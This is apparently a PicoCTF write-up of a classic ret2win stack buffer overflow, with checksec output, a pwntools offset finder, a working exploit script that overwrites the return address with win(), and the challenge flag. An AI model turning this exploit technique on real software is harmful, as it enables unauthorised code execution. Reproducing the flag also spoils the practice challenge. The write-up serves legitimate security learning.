---
title: "PicoCTF - Buffer Overflow 1 (Ret2Win)"
description: "Classic stack buffer overflow on a 32-bit binary. Overflowed a local buffer to overwrite the return address and redirect execution to a hidden win function."
platform: "PicoCTF"
category: "Pwn"
difficulty: "Medium"
date: 2026-02-20
---

## Challenge Info

**Platform:** PicoCTF
**Category:** Binary Exploitation
**Difficulty:** Medium

## Looking at the Binary

```bash
file vuln
# vuln: ELF 32-bit LSB executable, not stripped

checksec vuln
# Arch: i386
# RELRO: Partial
# Stack: No canary found
# NX: disabled
# PIE: No PIE
```

No canary, no PIE, NX off. Pretty much the most basic setup possible. The source showed a `vuln()` function using `gets()` into a 32-byte buffer, and a `win()` function that prints the flag but never gets called:

```c
void vuln(){
    char buf[BUFSIZE];  // BUFSIZE = 32
    gets(buf);
}
```

The goal is to overflow `buf` and overwrite the return address to point at `win()`.

## Finding the Offset

I used pwntools to generate a cyclic pattern and find exactly where the return address is:

```python
from pwn import *

p = process('./vuln')
p.sendline(cyclic(100))
p.wait()

core = p.corefile
offset = cyclic_find(core.eip)
print(f"Offset: {offset}")  # 44
```

44 bytes to reach EIP.

## Exploit

```python
from pwn import *

elf = ELF('./vuln')
p = remote('<host>', <port>)

win_addr = elf.symbols['win']

payload = b'A' * 44 + p32(win_addr)
p.sendline(payload)
p.interactive()
```

## Flag

```
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

## What I learned

- `gets()` is dangerous because it doesn't check how much it reads. It should never be used
- Without a stack canary there's nothing protecting the return address
- Always run `checksec` first, the protections tell you exactly what technique to use
